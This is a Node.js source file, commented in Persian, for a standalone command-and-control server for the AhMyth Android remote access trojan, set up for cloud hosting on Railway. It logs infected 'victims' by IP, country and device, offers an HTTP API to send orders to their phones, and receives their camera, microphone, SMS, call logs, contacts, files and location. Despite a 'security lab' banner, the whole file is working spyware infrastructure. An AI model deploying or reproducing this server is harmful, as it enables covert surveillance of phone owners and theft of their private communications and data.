/**
 * AhMyth Standalone Listener Server
 * برای deploy روی Railway و سایر پلتفرم‌های cloud
 * بدون نیاز به Electron GUI
 */

const io = require('socket.io');
const geoip = require('geoip-lite');
const http = require('http');

// ═══════════════════════════════════════════════════════════════
// تنظیمات از Environment Variables
// ═══════════════════════════════════════════════════════════════
const PORT = process.env.PORT || 20035;
const HOST = process.env.HOST || '0.0.0.0';

// ═══════════════════════════════════════════════════════════════
// مدل Victim برای ذخیره اطلاعات تارگت‌ها
// ═══════════════════════════════════════════════════════════════
class Victim {
    constructor(socket, ip, port, country, manf, model, release) {
        this.socket = socket;
        this.ip = ip;
        this.port = port;
        this.country = country;
        this.manf = manf;
        this.model = model;
        this.release = release;
        this.connectedAt = new Date();
    }
}

class VictimManager {
    constructor() {
        this.victimList = {};
    }

    addVictim(socket, ip, port, country, manf, model, release, id) {
        const victim = new Victim(socket, ip, port, country, manf, model, release);
        this.victimList[id] = victim;
        return victim;
    }

    getVictim(id) {
        return this.victimList[id] || null;
    }

    rmVictim(id) {
        delete this.victimList[id];
    }

    getVictimList() {
        return this.victimList;
    }

    getActiveCount() {
        return Object.keys(this.victimList).length;
    }

    // لیست خلاصه برای نمایش در کنسول
    getSummary() {
        return Object.entries(this.victimList).map(([id, v]) => ({
            id,
            ip: v.ip,
            country: v.country,
            device: `${v.manf} ${v.model}`,
            android: v.release,
            connectedAt: v.connectedAt
        }));
    }
}

const victimsList = new VictimManager();

// ═══════════════════════════════════════════════════════════════
// کدهای دستورات (برای ارتباط با payload)
// ═══════════════════════════════════════════════════════════════
const ORDERS = {
    camera: 'x0000ca',
    fileManager: 'x0000fm',
    calls: 'x0000cl',
    sms: 'x0000sm',
    mic: 'x0000mc',
    location: 'x0000lm',
    contacts: 'x0000cn'
};

// ═══════════════════════════════════════════════════════════════
// HTTP Server برای health check و API ساده
// ═══════════════════════════════════════════════════════════════
const httpServer = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // API Endpoints
    if (req.url === '/health' || req.url === '/') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'online',
            uptime: process.uptime(),
            activeVictims: victimsList.getActiveCount(),
            port: PORT,
            timestamp: new Date().toISOString()
        }));
    } else if (req.url === '/victims') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            count: victimsList.getActiveCount(),
            victims: victimsList.getSummary()
        }));
    } else if (req.url === '/api/command' && req.method === 'POST') {
        // دریافت دستور از طریق API
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const { victimId, command, params } = JSON.parse(body);
                const victim = victimsList.getVictim(victimId);
                if (victim && victim.socket) {
                    victim.socket.emit('order', { command, ...params });
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true, message: 'Command sent' }));
                } else {
                    res.writeHead(404, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: false, message: 'Victim not found' }));
                }
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, message: 'Invalid request' }));
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Not found' }));
    }
});

// ═══════════════════════════════════════════════════════════════
// Socket.IO Server
// ═══════════════════════════════════════════════════════════════
const ioServer = io(httpServer, {
    maxHttpBufferSize: 1024 * 1024 * 100, // 100MB
    pingInterval: 10000,
    pingTimeout: 10000,
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['websocket', 'polling']
});

// ═══════════════════════════════════════════════════════════════
// مدیریت اتصالات
// ═══════════════════════════════════════════════════════════════
ioServer.on('connection', (socket) => {
    const address = socket.request.connection;
    const query = socket.handshake.query;
    const index = query.id;

    // استخراج IP
    let ip = socket.handshake.headers['x-forwarded-for'] ||
        socket.handshake.headers['x-real-ip'] ||
        address.remoteAddress;
    ip = ip ? ip.split(',')[0].trim() : 'unknown';
    if (ip.includes(':')) {
        ip = ip.substring(ip.lastIndexOf(':') + 1);
    }

    // تشخیص کشور
    let country = null;
    const geo = geoip.lookup(ip);
    if (geo) {
        country = geo.country.toLowerCase();
    }

    // اضافه کردن victim به لیست
    victimsList.addVictim(
        socket,
        ip,
        address.remotePort,
        country,
        query.manf || 'Unknown',
        query.model || 'Unknown',
        query.release || 'Unknown',
        index
    );

    console.log('\n' + '═'.repeat(60));
    console.log('🔔 اتصال جدید!');
    console.log(`   📱 دستگاه: ${query.manf} ${query.model}`);
    console.log(`   🤖 اندروید: ${query.release}`);
    console.log(`   🌐 IP: ${ip}`);
    console.log(`   🏳️  کشور: ${country || 'نامشخص'}`);
    console.log(`   🆔 ID: ${index}`);
    console.log(`   📊 تعداد فعال: ${victimsList.getActiveCount()}`);
    console.log('═'.repeat(60));

    // ═══════════════════════════════════════════════════════════════
    // Event Handlers برای دستورات مختلف
    // ═══════════════════════════════════════════════════════════════

    // دوربین
    socket.on(ORDERS.camera, (data) => {
        console.log(`[📷 CAMERA] دریافت داده از ${index}:`, typeof data === 'object' ? 'Image Data' : data);
        // می‌تونی داده رو ذخیره کنی یا به جایی ارسال کنی
    });

    // فایل منیجر
    socket.on(ORDERS.fileManager, (data) => {
        console.log(`[📁 FILES] دریافت داده از ${index}`);
    });

    // لاگ تماس‌ها
    socket.on(ORDERS.calls, (data) => {
        console.log(`[📞 CALLS] دریافت داده از ${index}`);
    });

    // پیامک‌ها
    socket.on(ORDERS.sms, (data) => {
        console.log(`[💬 SMS] دریافت داده از ${index}`);
    });

    // میکروفون
    socket.on(ORDERS.mic, (data) => {
        console.log(`[🎤 MIC] دریافت داده از ${index}`);
    });

    // موقعیت مکانی
    socket.on(ORDERS.location, (data) => {
        console.log(`[📍 LOCATION] دریافت داده از ${index}:`, data);
    });

    // مخاطبین
    socket.on(ORDERS.contacts, (data) => {
        console.log(`[👥 CONTACTS] دریافت داده از ${index}`);
    });

    // ═══════════════════════════════════════════════════════════════
    // مدیریت قطع اتصال
    // ═══════════════════════════════════════════════════════════════
    socket.on('disconnect', (reason) => {
        const victim = victimsList.getVictim(index);
        victimsList.rmVictim(index);

        console.log('\n' + '─'.repeat(60));
        console.log('⚠️  قطع اتصال!');
        console.log(`   🆔 ID: ${index}`);
        console.log(`   📝 دلیل: ${reason}`);
        console.log(`   📊 تعداد باقی‌مانده: ${victimsList.getActiveCount()}`);
        console.log('─'.repeat(60));
    });

    // Error handling
    socket.on('error', (error) => {
        console.error(`[❌ ERROR] Socket error for ${index}:`, error.message);
    });
});

// ═══════════════════════════════════════════════════════════════
// راه‌اندازی سرور
// ═══════════════════════════════════════════════════════════════
httpServer.listen(PORT, HOST, () => {
    console.log('\n');
    console.log('╔══════════════════════════════════════════════════════════╗');
    console.log('║        AhMyth Standalone Listener Server                 ║');
    console.log('║        برای استفاده آزمایشگاهی امنیتی                    ║');
    console.log('╠══════════════════════════════════════════════════════════╣');
    console.log(`║  🚀 Server Status: ONLINE                                ║`);
    console.log(`║  🌐 Listening on: ${HOST}:${PORT}                         `);
    console.log(`║  📡 External: tramway.proxy.rlwy.net:${PORT}              `);
    console.log('╠══════════════════════════════════════════════════════════╣');
    console.log('║  API Endpoints:                                          ║');
    console.log('║  • GET  /health  - وضعیت سرور                            ║');
    console.log('║  • GET  /victims - لیست تارگت‌ها                          ║');
    console.log('║  • POST /api/command - ارسال دستور                       ║');
    console.log('╚══════════════════════════════════════════════════════════╝');
    console.log('\n⏳ در انتظار اتصالات...\n');
});

// ═══════════════════════════════════════════════════════════════
// مدیریت خطاها و سیگنال‌ها
// ═══════════════════════════════════════════════════════════════
process.on('uncaughtException', (error) => {
    console.error('[❌ UNCAUGHT EXCEPTION]:', error.message);
    if (error.code === 'EADDRINUSE') {
        console.error(`Port ${PORT} is already in use!`);
        process.exit(1);
    }
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('[❌ UNHANDLED REJECTION]:', reason);
});

// Graceful shutdown
const shutdown = () => {
    console.log('\n\n🛑 Shutting down server...');
    ioServer.close(() => {
        console.log('Socket.IO server closed');
    });
    httpServer.close(() => {
        console.log('HTTP server closed');
        process.exit(0);
    });
    
    // Force exit after 5 seconds
    setTimeout(() => {
        console.log('Forcing exit...');
        process.exit(0);
    }, 5000);
};

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

// ═══════════════════════════════════════════════════════════════
// نمایش وضعیت هر 60 ثانیه
// ═══════════════════════════════════════════════════════════════
setInterval(() => {
    const count = victimsList.getActiveCount();
    if (count > 0) {
        console.log(`\n[📊 STATUS] ${new Date().toLocaleTimeString()} - فعال: ${count} تارگت`);
    }
}, 60000);
